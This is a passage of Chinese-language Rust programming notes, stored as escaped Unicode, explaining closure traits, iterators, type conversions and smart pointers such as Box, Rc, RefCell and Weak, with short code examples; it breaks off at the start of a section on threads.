FnMut\uff1a\u4ee5\u53ef\u53d8\u501f\u7528\u65b9\u5f0f\u6355\u83b7\u73af\u5883\u4e2d\u7684\u503c \u76f4\u63a5\u8c03\u7528\u65f6\u9700\u8981\u5c06\u95ed\u5305\u6807\u8bb0\u4e3a mut let mut s = String :: new (); let mut update_string = | st | s . push_str ( st ); update_string ( \"test\" ); \u5f53\u4f5c\u53d8\u91cf\u65f6\u4e0d\u9700\u8981\u6807\u8bb0\u4e3a mut fn exec <' a , F : FnMut ( &' a str ) > ( mut f : F ) { // \u8fd9\u91cc\u9700\u8981 mut f ( \"test\" ); } fn main () { let mut s = String :: new (); let update_string = | st | s . push_str ( st ); // \u8fd9\u91cc\u4e0d\u9700\u8981 mut exec ( update_string ); } Fn\uff1a\u4ee5\u4e0d\u53ef\u53d8\u501f\u7528\u7684\u65b9\u5f0f\u6355\u83b7\u73af\u5883\u4e2d\u7684\u503c \u4e00\u4e2a\u95ed\u5305\u5b9e\u73b0\u4e86\u54ea\u79cd Fn trait \u53d6\u51b3\u4e8e\u8be5\u95ed\u5305 \u5982\u4f55\u4f7f\u7528 \u88ab\u6355\u83b7\u7684\u53d8\u91cf\uff0c\u800c\u4e0d\u662f\u5982\u4f55\u6355\u83b7\u3002\u800c move \u5219\u5173\u6ce8\u4e8e\u5982\u4f55\u6355\u83b7\uff0c\u6709 move \u5219\u5f3a\u5236\u83b7\u53d6\u6240\u6709\u6743 \u4f7f\u7528\u4e86 move \u5173\u952e\u5b57\u4ecd\u7136\u53ef\u4ee5\u5b9e\u73b0 Fn trait\uff08\u5f53\u95ed\u5305\u5bf9\u4e8e\u6355\u83b7\u53d8\u91cf\u7684\u4f7f\u7528\u4ec5\u4ec5\u662f\u4e0d\u53ef\u53d8\u501f\u7528\u65f6\uff09 \u4e09\u79cd Fn \u7684\u5173\u7cfb pub trait Fn < Args > : FnMut < Args > { extern \"rust-call\" fn call ( & self , args : Args ) -> Self :: Output ; } pub trait FnMut < Args > : FnOnce < Args > { extern \"rust-call\" fn call_mut ( & mut self , args : Args ) -> Self :: Output ; } pub trait FnOnce < Args > { type Output ; extern \"rust-call\" fn call_once ( self , args : Args ) -> Self :: Output ; } \u6240\u6709\u95ed\u5305\u90fd\u4f1a\u5b9e\u73b0 FnOnce trait\uff0c\u56e0\u4e3a\u81f3\u5c11\u53ef\u4ee5\u88ab\u8c03\u7528\u4e00\u6b21 \u6ca1\u6709\u79fb\u51fa\u6355\u83b7\u53d8\u91cf\u6240\u6709\u6743\u7684\u95ed\u5305\u81ea\u52a8\u5b9e\u73b0 FnMut trait \u4e0d\u9700\u8981\u5bf9\u6355\u83b7\u53d8\u91cf\u8fdb\u884c\u6539\u53d8\u7684\u95ed\u5305\u81ea\u52a8\u5b9e\u73b0 Fn trait \u5b9e\u73b0 Fn \u7684\u524d\u63d0\u662f\u5b9e\u73b0 FnMut\uff0c\u5b9e\u73b0 FnMut \u7684\u524d\u63d0\u662f\u5b9e\u73b0 FnOnce Fn \u83b7\u53d6 &self\u3001FnMut \u83b7\u53d6 &mut self\u3001FnOnce \u83b7\u53d6 self \u5efa\u8bae\u5148\u4f7f\u7528 Fn\uff0c\u7136\u540e\u9760\u7f16\u8bd1\u5668\u6765\u5224\u65ad\u6b63\u8bef\u4ee5\u53ca\u5982\u4f55\u9009\u62e9 \u95ed\u5305\u4f5c\u4e3a\u8fd4\u56de\u503c \u4e0d\u80fd\u4f7f\u7528 Fn(...) -> ... \u4f5c\u4e3a\u8fd4\u56de\u503c\uff0c\u56e0\u4e3a\u5b83\u662f\u7279\u5f81\uff0c\u6ca1\u6709\u56fa\u5b9a\u5185\u5b58\u5927\u5c0f \u53ef\u4ee5\u4f7f\u7528 impl Fn(...) -> ... \u4f5c\u4e3a\u8fd4\u56de\u503c \u53ef\u4ee5\u4f7f\u7528\u7279\u5f81\u5bf9\u8c61\uff0c\u5373 Box<dyn Fn(...) -> ...> \u7684\u5f62\u5f0f \u8fed\u4ee3\u5668 \u00b6 for \u5faa\u73af\u904d\u5386\u6570\u7ec4\u5b9e\u9645\u4e0a\u662f\u5728\u6570\u7ec4\u4e0a\u8c03\u7528\u4e86 into_iter \u65b9\u6cd5\uff08\u6765\u81ea IntoIterator trait\uff09 Iterator trait pub trait Iterator { type Item ; fn next ( & mut self ) -> Option < Self :: Item > ; } next \u65b9\u6cd5\u6709\u503c\u65f6\u8fd4\u56de Some(...)\uff0c\u8fed\u4ee3\u7ed3\u675f\u5219\u8fd4\u56de None \u624b\u52a8\u8fed\u4ee3\u5fc5\u987b\u58f0\u660e\u8fed\u4ee3\u5668\u4e3a mut \u4ec5\u9700\u8981\u5b9e\u73b0 next \u65b9\u6cd5\uff0c\u5176\u5b83\u65b9\u6cd5\u6709\u9ed8\u8ba4\u5b9e\u73b0 IntoIterator trait Iterator \u81ea\u52a8\u5b9e\u73b0 IntoIterator impl < I : Iterator > IntoIterator for I { type Item = I :: Item ; type IntoIter = I ; #[inline] fn into_iter ( self ) -> I { self } } into_iter\u3001iter\u3001iter_mut .into_iter \u4f1a\u593a\u8d70\u6240\u6709\u6743 .iter \u662f\u4e0d\u53ef\u53d8\u501f\u7528\uff0c\u8c03\u7528 next \u8fd4\u56de Some(&T) .iter_mut \u662f\u53ef\u53d8\u501f\u7528\uff0c\u8c03\u7528 next \u8fd4\u56de Some(&mut T) \u6d88\u8d39\u8005\u9002\u914d\u5668 \u5185\u90e8\u8c03\u7528\u4e86 next \u7684\u8fed\u4ee3\u5668\u65b9\u6cd5\uff0c\u4f1a\u6d88\u8017\u8fed\u4ee3\u5668\u4e0a\u5143\u7d20\uff0c\u8fd4\u56de\u5176\u5b83\u503c\uff0c\u79f0\u4e3a\u6d88\u8d39\u8005\u9002\u914d\u5668 \u4f8b\u5982 .sum \u65b9\u6cd5\uff0c\u5185\u90e8\u8c03\u7528 next \u6765\u5bf9\u6240\u6709\u5143\u7d20\u6c42\u548c\uff0c\u4e5f\u4f1a\u62ff\u8d70\u8fed\u4ee3\u5668\u7684\u6240\u6709\u6743 collect \u65b9\u6cd5\u53ef\u4ee5\u5c06\u8fed\u4ee3\u5668\u4e2d\u7684\u503c\u6536\u96c6\u5230\u96c6\u5408\u7c7b\u578b\u4e2d\uff0c\u4f46\u9700\u8981\u5148\u6807\u6ce8\u8981\u6536\u96c6\u5230\u7684\u7c7b\u578b let v : Vec < _ > = iterator . collect (); \u8fed\u4ee3\u5668\u9002\u914d\u5668 \u8fed\u4ee3\u5668\u9002\u914d\u5668\u6216\u8fd4\u56de\u65b0\u7684\u8fed\u4ee3\u5668 \u4f8b\u5982 .map .filter .zip \u53ef\u4ee5\u8fdb\u884c\u94fe\u5f0f\u8c03\u7528\uff0c\u4e00\u822c\u4f7f\u7528 collect \u6536\u5c3e\u6536\u96c6\u5143\u7d20 \u6df1\u5165\u7c7b\u578b \u00b6 newtype \u5373\u4f7f\u7528\u4e00\u4e2a\u5143\u7ec4\u7ed3\u6784\u4f53\u6765\u5305\u88c5 \u53ef\u4ee5\u4e3a\u5916\u90e8\u7c7b\u578b\u5b9e\u73b0\u5916\u90e8 trait \u53ef\u4ee5\u5177\u6709\u66f4\u597d\u7684\u53ef\u8bfb\u6027\uff0c\u4ee5\u53ca\u53ef\u4ee5\u5b9e\u73b0\u7c7b\u578b\u5f02\u5316 \u7c7b\u578b\u522b\u540d \u5982 type Meters = u32 \u4ec5\u4ec5\u662f\u522b\u540d\uff0c\u5e76\u4e0d\u662f\u5168\u65b0\u7c7b\u578b\uff0c\u5373\u4e0a\u9762 Meters \u7c7b\u578b\u548c u32 \u5728\u7f16\u8bd1\u5668\u773c\u91cc\u6ca1\u6709\u533a\u522b \u53ef\u4ee5\u589e\u52a0\u53ef\u8bfb\u6027\u3001\u7b80\u5316\u4ee3\u7801 \u7528\u4e0d\u8fd4\u56de\u7c7b\u578b ! \u5bf9\u4e8e match\uff0c\u5404\u5206\u652f\u8fd4\u56de\u7684\u7c7b\u578b\u9700\u8981\u4e00\u81f4\uff0c\u4f46\u5982\u679c\u6709\u5206\u652f\u8fd4\u56de ! \u7c7b\u578b\uff0c\u5219\u53ef\u4ee5\u5ffd\u7565\u8fd9\u4e2a\u5206\u652f \u5b9a\u957f\u7c7b\u578b\u4e0e\u4e0d\u5b9a\u957f\u7c7b\u578b \u5b9a\u957f\u7c7b\u578b\u81ea\u52a8\u5b9e\u73b0 Sized trait\uff0c\u5e76\u4e14\u5728\u4f7f\u7528\u6cdb\u578b\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u6dfb\u52a0 Sized \u7ea6\u675f \u4e0d\u5b9a\u957f\u7c7b\u578b\uff08\u52a8\u6001\u5927\u5c0f\u7c7b\u578b\uff0cDST\uff09\uff0c\u5305\u62ec\u5207\u7247\u3001str\u3001\u7279\u5f81\u7b49\uff08Vec \u7b49\u96c6\u5408\u7c7b\u578b\u662f\u5b9a\u957f\u7684\uff0c\u56e0\u4e3a\u5728\u6808\u4e0a\u5b58\u50a8\u7684\u4fe1\u606f\u5b9a\u957f\uff09 DST \u65e0\u6cd5\u5355\u72ec\u4f7f\u7528\uff0c\u53ea\u80fd\u901a\u8fc7\u5f15\u7528\u6216\u8005 Box \u6765\u95f4\u63a5\u4f7f\u7528\uff0c\u5982\u5c06\u7279\u5f81\u5c01\u88c5\u4e3a\u7279\u5f81\u5bf9\u8c61 ?Size \u7279\u5f81\u8868\u793a\u65e2\u6709\u53ef\u80fd\u662f\u56fa\u5b9a\u5927\u5c0f\u7c7b\u578b\u4e5f\u6709\u53ef\u80fd\u662f DST\uff1a fn func < T : ? Sized > ( t : & T ) {} \u5c06 str \u5305\u88f9\u4e3a Box<str> \u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528 Box::new(\"...\" as str)\uff0c\u56e0\u4e3a\u8fd9\u91cc\u5e76\u4e0d\u80fd\u77e5\u9053 str \u7684\u5927\u5c0f\u3002\u53ef\u4ee5\u4f7f\u7528 .into() \u6765\u8ba9\u7f16\u8bd1\u5668\u6765\u8f6c\u6362\u7c7b\u578b\uff08\u5c06 &str \u8f6c\u4e3a Box\uff09 let s : Box < str > = \"...\" . into (); \u6574\u6570\u4e0e\u679a\u4e3e\u7684\u7c7b\u578b\u8f6c\u6362 enum MyEnum { A = 1 , B = 2 , C = 3 , } \u5c06\u679a\u4e3e\u8f6c\u6362\u4e3a\u6574\u6570\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 as\uff1a let x = MyEnum :: A as i32 ; \u6574\u6570\u8f6c\u4e3a\u679a\u4e3e\u5219\u76f8\u5bf9\u590d\u6742\uff0c\u6709\u51e0\u79cd\u65b9\u6cd5 \u4f7f\u7528\u7b2c\u4e09\u65b9\u5e93\uff1anum-traits num-derive \u6216 num_enums \u7b49 \u4f7f\u7528 TryFrom trait use std :: convert :: TryFrom ; impl TryFrom < i32 > for MyEnum { type Error = (); fn try_from ( v : i32 ) -> Result < Self , Self :: Error > { match v { x if x == MyEnum :: A as i32 => Ok ( MyEnum :: A ), x if x == MyEnum :: B as i32 => Ok ( MyEnum :: B ), x if x == MyEnum :: C as i32 => Ok ( MyEnum :: C ), _ => Err (()), } } } \u4e3a MyEnum \u5b9e\u73b0\u4e86 TryFrom<i32> \u540e\u5c31\u53ef\u4ee5\u8c03\u7528 i32.try_into() \u6765\u5c1d\u8bd5\u8f6c\u4e3a MyEnum \u4e86 let x = 1 match x . try_into () { Ok ( EyEnum :: A ) => .. ., .. . } \u4f7f\u7528 unsafe transmute \u8f6c\u6362 #[repr(i32)] // \u89c4\u5b9a\u5185\u90e8\u5b58\u50a8\u4e3a i32 enum MyEnum { .. . } let x : i32 = 1 ; let y : MyEnum = unsafe { std :: mem :: transmute ( x ) }; \u667a\u80fd\u6307\u9488 \u00b6 \u5f15\u7528\u4ec5\u662f\u501f\u7528\u6570\u636e\uff0c\u800c\u667a\u80fd\u6307\u9488\u5f80\u5f80\u53ef\u4ee5\u62e5\u6709\u6307\u5411\u7684\u6570\u636e \u667a\u80fd\u6307\u9488\u5b9e\u73b0\u4e86 Deref \u548c Drop trait Deref \u8ba9\u667a\u80fd\u6307\u9488\u53ef\u4ee5\u50cf\u5f15\u7528\u4e00\u6837\u5de5\u4f5c Drop \u5141\u8bb8\u6307\u5b9a\u667a\u80fd\u6307\u9488\u8d85\u51fa\u4f5c\u7528\u57df\u540e\u81ea\u52a8\u6267\u884c\u7684\u4ee3\u7801 Deref trait \u00b6 use std :: ops :: Deref \u5b9e\u73b0\u4e86 Deref \u4e4b\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528 * \u89e3\u5f15\u7528\u4e86 use std :: ops :: Deref struct MyBox < T > ( T ); impl < T > MyBox < T > { fn new ( x : T ) -> MyBox < T > { MyBox ( x ) } } impl < T > Deref for MyBox < T > { type Target = T ; fn deref ( & self ) -> & Self :: Target { & self . 0 } } deref \u8fd4\u56de\u5185\u90e8\u503c\u7684\u6b63\u5e38\u5f15\u7528\uff0c\u53ef\u4ee5\u4f7f\u7528 * \u6765\u89e3\u5f15\u7528 \u5bf9 MyBox \u8fdb\u884c\u89e3\u5f15\u7528\u65f6\u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u662f * ( x . deref ()) \u53c2\u6570\u4e2d\u9690\u5f0f Deref \u8f6c\u6362 fn func ( s : & str ) { println! ( \"{}\" , s ) } fn main () { let s = MyBox :: new ( String :: from ( \"...\" )); func ( & s ); } \u8c03\u7528\u65f6 &s: &MyBox -> &String -> &str \u5f15\u7528\u5f52\u4e00\u5316 \u667a\u80fd\u6307\u9488\u4f1a\u4ece\u7ed3\u6784\u4f53\u4e2d\u8131\u58f3\u51fa\u6765\u5f97\u5230\u5185\u90e8\u7684\u5f15\u7528\u7c7b\u578b \u591a\u91cd\u5f15\u7528\u53ef\u4ee5\u5f52\u4e00\u5316 impl < T : ? Sized > Deref for & T { type Target = T ; fn deref ( & self ) -> & T { * self // \u8fd9\u91cc self \u662f &&T \u7c7b\u578b } } DerefMut \u4e0e Deref \u5f53 T: Deref<Target=U> \u65f6\uff0c&T \u53ef\u4ee5\u8f6c\u6362\u4e3a &U\u3001&mut T \u4e5f\u53ef\u4ee5\u8f6c\u6362\u4e3a &U\uff08rust \u53ef\u4ee5\u628a\u53ef\u53d8\u5f15\u7528\u9690\u5f0f\u8f6c\u6362\u4e3a\u4e0d\u53ef\u53d8\u5f15\u7528\uff09 \u5f53 T: DerefMut<Target=U> \u65f6\uff0c&mut T \u53ef\u4ee5\u8f6c\u6362\u4e3a &mut U \u5b9e\u73b0 DerefMut trait \u9700\u8981\u5148\u5b9e\u73b0 Deref use std :: ops :: DerefMut ; impl < T > DerefMut for MyBox < T > { fn deref_mut ( & mut self ) -> & mut Self :: Target { & mut self . 0 } } Drop trait \u00b6 \u53d8\u91cf\u79bb\u5f00\u4f5c\u7528\u57df\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u6267\u884c Drop trait \u7684 drop \u65b9\u6cd5 \u53ef\u4ee5\u4e3a\u7ed3\u6784\u4f53\u81ea\u5b9a\u4e49 drop struct A ; struct B ; impl Drop for A { fn drop ( & mut self ) { println! ( \"drop A\" ) } } impl Drop for B { fn drop ( & mut self ) { println! ( \"drop B\" ) } } struct C { a : A , b : B , } impl Drop for C { fn drop ( & mut self ) { println! ( \"drop C\" ) } } fn main () { let x = C { a : A , b : B }; println! ( \"end\" ); } // end // drop C // drop A // drop B drop \u65b9\u6cd5\u501f\u7528\u76ee\u6807\u4f7f\u7528\u7684\u662f\u53ef\u53d8\u5f15\u7528\uff0c\u4e0d\u4f1a\u62ff\u8d70\u6240\u6709\u6743 \u7ed3\u6784\u4f53\u6bcf\u4e2a\u5b57\u6bb5\u90fd\u4f1a drop \u5148\u58f0\u660e\u7684\u53d8\u91cf\u540e drop\u3001\u7ed3\u6784\u4f53\u5185\u90e8\u6309\u987a\u5e8f\u4f9d\u6b21 drop \u5373\u4f7f C \u4e0d\u624b\u52a8\u5b9e\u73b0 Drop\uff0c\u4e5f\u4f1a\u8c03\u7528\u5230 A \u548c B \u7684 drop\uff0c\u56e0\u4e3a\u4f1a\u4e3a C \u63d0\u4f9b\u9ed8\u8ba4\u7684 Drop \u5b9e\u73b0 .drop \u51fd\u6570\u4e0d\u80fd\u624b\u52a8\u8c03\u7528\uff0c\u56e0\u4e3a\u5b83\u662f\u501f\u7528\uff0c\u540e\u9762\u4f9d\u7136\u53ef\u4ee5\u8bbf\u95ee\u539f\u503c\uff0c\u4f46\u662f\u53ef\u80fd\u5df2\u7ecf\u88ab\u6e05\u7406\u4e86 \u4f7f\u7528 std::mem::drop \u51fd\u6570\uff08\u5728 prelude \u4e2d\uff09\u6765\u624b\u52a8 drop std::mem::drop \u7684\u7b7e\u540d\uff1a pub fn drop < T > ( _x : T ) \u8fd9\u4e2a drop \u662f\u4e00\u4e2a\u7a7a\u5b9e\u73b0\uff0c\u5b83\u53ef\u4ee5\u5e26\u8d70\u76ee\u6807\u7684\u6240\u6709\u6743\uff0c\u7136\u540e\u8fd9\u4e2a\u51fd\u6570\u76f4\u63a5\u7ed3\u675f\uff0c\u76ee\u6807\u7684\u4f5c\u7528\u57df\u4e5f\u5c31\u7ed3\u675f\u4e86\uff0c\u5bfc\u81f4\u81ea\u52a8\u8c03\u7528 drop \u65b9\u6cd5\u6765\u91ca\u653e \u65e0\u6cd5\u4e3a\u540c\u4e00\u4e2a\u7c7b\u578b\u5b9e\u73b0 Copy \u548c Drop Box \u00b6 Box<T> \u5141\u8bb8\u5c06\u4e00\u4e2a\u503c\u5206\u914d\u5230\u5806\u4e0a\uff0c\u7136\u540e\u5728\u6808\u4e0a\u4fdd\u7559\u4e00\u4e2a\u667a\u80fd\u6307\u9488\u6307\u5411\u5806\u4e0a\u6570\u636e \u53ef\u4ee5\u5c06\u6570\u636e\u5206\u914d\u5230\u5806\u4e0a let a = Box :: new ( 3 ); println! ( \"a = {}\" , a ); // \u5229\u7528 Deref \u81ea\u52a8\u89e3\u5f15\u7528 let b = * a + 1 ; // \u8868\u8fbe\u5f0f\u4e2d\u9700\u8981\u624b\u52a8\u89e3\u5f15\u7528 \u4f46\u662f Box::new \u4f1a\u5148\u5728\u6808\u4e0a\u5206\u914d\u7a7a\u95f4\u7136\u540e\u79fb\u5230\u5806\u4e0a\uff0c\u6bd4\u5982 Box::new([0; 1000000000000]) \u4f1a\u62a5\u9519\u6808\u6ea2\u51fa \u907f\u514d\u6808\u4e0a\u6570\u636e\u62f7\u8d1d \u6808\u4e0a\u6570\u636e\u6240\u6709\u6743\u8f6c\u79fb\u7684\u65f6\u5019\u4f1a\u62f7\u8d1d\u4e00\u4efd\u6570\u636e\uff0c\u4f46\u5728\u5806\u4e0a\u65f6\u5806\u4e0a\u6570\u636e\u4e0d\u4f1a\u62f7\u8d1d\uff0c\u4ec5\u4ec5\u9700\u8981\u62f7\u8d1d\u4e00\u4efd\u6808\u4e0a\u7684\u6307\u9488\u5373\u53ef\u5b8c\u6210\u6240\u6709\u6743\u8f6c\u79fb \u5c06 DST \u53d8\u4e3a\u56fa\u5b9a\u5927\u5c0f\u7c7b\u578b \u5982\u9012\u5f52\u7c7b\u578b\uff0crust \u4e0d\u77e5\u9053\u9012\u5f52\u7c7b\u578b\u9700\u8981\u591a\u5c11\u7a7a\u95f4\uff0c\u4f46\u5305\u88f9\u4e00\u5c42 Box \u5219\u53ef\u4ee5\u53d8\u6210\u56fa\u5b9a\u5927\u5c0f enum List { Cons ( i32 , Box < List > ), Nil , } \u5c06\u7279\u5f81\u8f6c\u4e3a\u7279\u5f81\u5bf9\u8c61 Box::leak \u6d88\u8d39\u6389 Box\uff0c\u5e76\u5f3a\u5236\u76ee\u6807\u503c\u4ece\u5185\u5b58\u4e2d\u6cc4\u9732 \u4f8b\u5982\u5c06 String \u7c7b\u578b\u53d8\u6210\u62e5\u6709 'static \u751f\u547d\u5468\u671f\u7684 &str \u7c7b\u578b fn func () -> & ' static str { let mut s = String :: new (); s . push_str ( \"...\" ); Box :: leak ( s . into_boxed_str ()) } Rc \u4e0e Arc \u00b6 Rc \u5373\u5f15\u7528\u8ba1\u6570\uff08reference counting\uff09\uff0c\u8bb0\u5f55\u4e00\u4e2a\u6570\u636e\u88ab\u5f15\u7528\u7684\u6b21\u6570\u6765\u786e\u5b9a\u6570\u636e\u662f\u5426\u88ab\u4f7f\u7528\uff0c\u5f53\u5f15\u7528\u6b21\u6570\u5f52\u96f6\uff0c\u5219\u6e05\u7406\u91ca\u653e \u4f7f\u7528 clone \u6765\u590d\u5236\u667a\u80fd\u6307\u9488\u5e76\u589e\u52a0\u5f15\u7528\u8ba1\u6570 use std :: rc :: Rc let a = Rc :: new ( String :: from ( \"...\" )); let b = Rc :: clone ( & a ); assert_eq! ( 2 , Rc :: strong_count ( & a )); assert_eq! ( 2 , Rc :: strong_count ( & b )); \u4f7f\u7528 Rc::strong_count \u6765\u83b7\u53d6\u8ba1\u6570 Rc \u5728\u79bb\u5f00\u4f5c\u7528\u57df\u65f6\u4f1a\u88ab\u91ca\u653e\uff0c\u5e76\u5c06\u5f15\u7528\u6570\u636e\u7684\u8ba1\u6570\u51cf\u4e00 Rc \u662f\u6307\u5411\u5e95\u5c42\u6570\u636e\u7684\u4e0d\u53ef\u53d8\u5f15\u7528\uff0c\u65e0\u6cd5\u901a\u8fc7\u5b83\u6765\u4fee\u6539\u6570\u636e Rc \u53ea\u80fd\u7528\u5728\u540c\u4e00\u7ebf\u7a0b\u5185\u90e8\uff0c\u591a\u7ebf\u7a0b\u4e4b\u95f4\u5171\u4eab\u9700\u8981\u4f7f\u7528 Arc\uff08Atomic Rc\uff09\uff0c\u5176 api \u4e00\u81f4\u4f46\u662f\u7ebf\u7a0b\u5b89\u5168\u7684\uff0c\u4e0d\u8fc7\u6548\u7387\u4f1a\u6709\u6240\u964d\u4f4e \u9700\u8981 use std :: sync :: Arc Cell \u4e0e RefCell \u00b6 Cell<T> \u9002\u7528\u4e8e T \u5b9e\u73b0 Copy \u7684\u60c5\u51b5\uff0c\u800c\u6ca1\u6709 Copy \u7684\u8bdd\u5219\u4e0d\u80fd\u4f7f\u7528 Cell \u53ea\u80fd\u4f7f\u7528 RefCell\u3002\u4e8c\u8005\u90fd\u53ef\u4ee5\u8fbe\u5230\u5185\u90e8\u53ef\u53d8\u6027\u7684\u6548\u679c Rust \u89c4\u5b9a\u4e00\u4e2a\u7ed3\u6784\u4f53\u4e2d\u7684\u5b57\u6bb5\u8981\u4e48\u90fd\u662f immutable \u8981\u4e48\u90fd\u662f mutable\uff0c\u800c\u4e0d\u80fd\u5c06\u90e8\u5206\u5b57\u6bb5\u6807\u8bb0\u4e3a mutable\u3002\u4f46\u53ef\u4ee5\u4f7f\u7528 Cell \u6216 RefCell \u5305\u88f9\u60f3\u8981\u53ef\u53d8\u7684\u5b57\u6bb5\uff0c\u8fd9\u6837\u5c31\u5b9e\u73b0\u4e86 immutable \u7ed3\u6784\u4f53\u4e2d\u90e8\u5206\u5b57\u6bb5\u53ef\u53d8\u7684\u6548\u679c\u800c\u4e0d\u5fc5\u5c06\u6574\u4e2a\u7ed3\u6784\u4f53\u6807\u8bb0\u4e3a mutable Cell \u00b6 use std :: cell :: Cell ; .get() \u53d6\u503c\uff08Copy \u51fa\u6765\uff09 \u53ef\u4ee5\u4f7f\u7528 .set() \u8bbe\u7f6e\u65b0\u503c\u800c\u4e0d\u9700\u8981\u5c06\u5176\u6807\u8bb0\u4e3a mut let c = Cell :: new ( \"abcd\" ); let a = c . get (); c . set ( \"efgh\" ); let b = c . get (); println! ( \"{} {}\" , a , b ); // abcd efgh \u4f8b\uff1a \u4e0b\u9762\u4ee3\u7801\u4f1a\u62a5\u9519\uff1a let mut x = 1 ; let y = & mut x ; let z = & mut x ; x = 2 ; * y = 3 ; * z = 4 ; println! ( \"{}\" , x ); \u800c\u4e0b\u9762\u7684\u4e0d\u4f1a\uff1a let x = Cell :: new ( 1 ); let y = & x ; let z = & x ; x . set ( 2 ); y . set ( 3 ); z . set ( 4 ); println! ( \"{}\" , x . get ()); \u8fd9\u91cc x \u4e5f\u4e0d\u5fc5\u58f0\u660e\u4e3a mut\uff0cy z \u90fd\u662f x \u7684\u4e0d\u53ef\u53d8\u5f15\u7528\uff0c\u53ef\u4ee5\u5171\u5b58 \u4f46\u53ef\u4ee5\u901a\u8fc7 x y z \u6765\u6539\u53d8 cell \u4e2d\u7684\u503c Cell \u6ca1\u6709\u6027\u80fd\u635f\u8017 Rust 1.37 \u4e2d\u589e\u52a0\u4e86\u4e24\u4e2a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5f88\u597d\u5730\u89e3\u51b3\u501f\u7528\u51b2\u7a81\uff1a Cell::from_mut\uff0c\u5c06 &mut T \u8f6c\u4e3a &Cell<T> Cell::as_slice_of_cells\uff0c\u5c06 &Cell<[T]> \u8f6c\u4e3a &[Cell<T>] RefCell \u00b6 use std :: cell :: RefCell ; \u53ef\u4ee5\u4f7f\u7f16\u8bd1\u671f\u53ef\u53d8\u548c\u4e0d\u53ef\u53d8\u5f15\u7528\u5171\u5b58 \u4f7f\u7528\u65f6\u53ef\u53d8\u548c\u4e0d\u53ef\u53d8\u5f15\u7528\u4e00\u6837\u4e0d\u80fd\u5171\u5b58\uff0c\u4f1a panic\uff0c\u5e76\u4e0d\u80fd\u4f9d\u6b21\u7ed5\u8fc7\u501f\u7528\u89c4\u5219 \u4e0e Cell \u63d0\u4f9b\u503c\u76f8\u6bd4\uff0cRefCell \u63d0\u4f9b\u5f15\u7528 .borrow() \u521b\u5efa\u4e0d\u53ef\u53d8\u5f15\u7528\u3001.borrow_mut() \u521b\u5efa\u53ef\u53d8\u5f15\u7528 RefCell \u9002\u7528\u4e8e\u7f16\u8bd1\u671f\u8bef\u62a5\u6216\u8005\u4e00\u4e2a\u5f15\u7528\u5728\u591a\u5904\u4f7f\u7528\u96be\u4ee5\u7ba1\u7406\u501f\u7528\u5173\u7cfb\u65f6 \u53ef\u4ee5\u5229\u7528 RefCell \u6765\u521b\u5efa\u4e00\u4e2a\u4e0d\u662f mut \u4f46\u662f\u5185\u90e8\u503c\u53ef\u53d8\u7684\u4e1c\u897f use std :: cell :: RefCell ; pub trait Messenger { fn send ( & self , msg : String ); // \u5b9a\u4e49\u65f6\u4e0d\u662f &mut self } pub struct MsgQueue { msg_cache : RefCell < Vec < String >> , } impl Messenger for MsgQueue { fn send ( & self , msg : String ) { self . msg_cache . borrow_mut (). push ( msg ) // self \u4e0d\u662f mut \u7684\uff0cmsg_cache \u4e5f\u5c31\u4e0d\u662f mut \u7684 } } Rc \u548c RefCell \u7ec4\u5408\u4f7f\u7528\uff0c\u53ef\u4ee5\u540c\u65f6\u62e5\u6709\u591a\u4e2a\u6240\u6709\u8005\u5e76\u5b9e\u73b0\u6570\u636e\u7684\u53ef\u53d8\u6027\uff1a use std :: cell :: RefCell ; use std :: rc :: Rc ; fn main () { let s = Rc :: new ( RefCell :: new ( \"...\" . to_string ())); let s1 = s . clone (); let s2 = s . clone (); s2 . borrow_mut (). push_str ( \"...\" ); println! ( \"{:?} \\n {:?} \\n {:?}\" , s , s1 , s2 ); } \u4f1a\u8f93\u51fa\u4e09\u904d RefCell { value: \"......\" } \u7ec4\u5408\u4f7f\u7528\u6027\u80fd\u5176\u5b9e\u5f88\u9ad8 Weak \u5f31\u5f15\u7528 \u00b6 use std :: rc :: Weak \u4f7f\u7528 Rc \u914d\u5408 RefCell \u4f1a\u6784\u9020\u51fa\u4e24\u4e2a\u6307\u9488\u4e92\u76f8\u6307\u4e5f\u5c31\u662f\u5faa\u73af\u5f15\u7528\u7684\u60c5\u51b5\uff0c\u53ef\u80fd\u4f1a\u9020\u6210\u5f15\u7528\u8ba1\u6570\u65e0\u6cd5\u6e05\u96f6\u4e0d\u4f1a drop \u4ece\u800c\u9020\u6210\u5185\u5b58\u6cc4\u6f0f \u4f7f\u7528 Weak \u53ef\u4ee5\u89e3\u51b3\u5faa\u73af\u5f15\u7528\u7684\u95ee\u9898\uff0c\u5b83\u5e76\u4e0d\u4fdd\u8bc1\u5f15\u7528\u5173\u7cfb\u4f1a\u5b58\u5728\uff0c\u4e0e Rc \u76f8\u6bd4\uff0c\u5b83\u7684\u7279\u70b9\uff1a \u4e0d\u4f1a\u8ba1\u6570 \u4e0d\u62e5\u6709\u503c\u7684\u6240\u6709\u6743 \u4e0d\u4f1a\u963b\u6b62\u503c\u7684\u91ca\u653e\uff08Rc \u53ea\u6709\u5f53\u8ba1\u6570\u4e3a 0 \u65f6\u624d\u80fd drop\uff09 Weak \u5728\u4f7f\u7528\u65f6\u9700\u8981\u5148\u8c03\u7528 upgrade \u65b9\u6cd5\u5f97\u5230\u4e00\u4e2a Option<Rc<T>> \u7c7b\u578b\u7684\u503c\uff08\u5f53\u5f15\u7528\u503c\u5b58\u5728\u65f6\u8fd4\u56de Some(rc)\uff0c\u53d6\u51fa Rc \u4f7f\u7528\uff0c\u4e0d\u5b58\u5728\u65f6\u8fd4\u56de None\uff09 \u5728 Rc<T> \u4e0a\u8c03\u7528 downgrade \u65b9\u6cd5\u5373\u53ef\u83b7\u5f97 Weak<T>\uff0c\u540c\u65f6\u4f1a\u8ba1\u5165\u5230\u8be5 Rc \u7684\u4e00\u4e2a weak_count \u4e0a \u5f53\u4f1a\u9020\u6210\u5faa\u73af\u5f15\u7528\u65f6\uff0c\u5c06\u5176\u4e2d\u4e00\u652f\u6362\u4e3a Weak \u5373\u53ef\u907f\u514d \u591a\u7ebf\u7a0b\u5e76\u53d1\u7f16\u7a0b \u00b6 \u4f7f\u7528\u7ebf\u7a0b \u00b6 \u521b\u5efa\u7ebf\u7a0b \u4f7f\u7528 